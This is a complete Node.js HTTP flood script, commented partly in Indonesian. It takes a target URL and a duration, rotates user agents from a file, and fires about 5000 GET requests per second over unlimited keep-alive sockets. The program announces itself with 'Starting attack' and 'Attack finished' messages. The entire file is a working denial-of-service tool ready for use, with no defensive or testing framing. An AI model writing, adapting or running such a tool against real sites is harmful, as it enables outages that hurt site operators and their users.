const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');

// Ambil argumen
const target = process.argv[2];
const time = parseInt(process.argv[3]);

if (!target || !time) {
    console.log('Usage: node rps-no-proxy.js <url> <time>');
    process.exit(1);
}

// Load User-Agents
let userAgents = [];
try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
    if (userAgents.length === 0) throw new Error('No User-Agents found.');
} catch (err) {
    console.error('❌ Failed loading ua.txt:', err.message);
    process.exit(1);
}

const parsedUrl = new URL(target);
const isHttps = parsedUrl.protocol === 'https:';

const agent = new (isHttps ? https : http).Agent({
    keepAlive: true,
    maxSockets: Infinity
});

// Config
const REQUESTS_PER_SECOND = 5000; // Set berapa rps (misal 5000 rps, bisa diubah)
const path = parsedUrl.pathname + parsedUrl.search;

console.log(`🚀 Starting attack on ${target} with ~${REQUESTS_PER_SECOND} RPS for ${time} seconds.`);

// Fungsi untuk mengirim request
function sendRequest() {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    const options = {
        protocol: parsedUrl.protocol,
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: path,
        method: 'GET',
        agent: agent,
        headers: {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        },
        timeout: 5000
    };

    const req = (isHttps ? https : http).request(options, res => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.end();
}

// Mulai banjir request
const interval = setInterval(() => {
    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
        sendRequest();
    }
}, 1000);

// Timer buat stop
setTimeout(() => {
    clearInterval(interval);
    console.log('🛑 Attack finished.');
    process.exit(0);
}, time * 1000);
